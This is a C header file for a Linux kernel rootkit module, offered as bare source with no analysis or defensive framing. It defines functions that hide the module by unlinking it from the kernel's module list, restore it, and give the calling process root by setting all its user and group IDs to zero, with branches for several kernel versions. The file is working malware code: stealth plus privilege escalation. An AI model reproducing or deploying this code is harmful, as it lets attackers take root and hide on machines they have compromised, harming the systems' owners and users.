#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/list.h>
#include <linux/export.h>
#include <linux/version.h> /* Linux version check */
#include <linux/cred.h>    /* set_root */
#include <linux/types.h>

#include "usrlib.h"
#include "commands.h"

static struct list_head *prev_module = NULL;
static bool is_hidden = false;

/**
 * Hide this module
 */
void hide_myself(void)
{
    if (!prev_module && !is_hidden)
    {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        is_hidden = true;
    }
}

/**
 * Show this module
 */
void show_myself(void)
{
    if (prev_module && is_hidden)
    {
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
        is_hidden = false;
    }
}

/**
 * Set current user as root
 */
void set_root(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
    current->uid = current->gid = 0;
    current->euid = current->egid = 0;
    current->suid = current->sgid = 0;
    current->fsuid = current->fsgid = 0;
#else
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
#endif
    commit_creds(newcreds);
#endif
}

#endif /* ROOTKIT_H */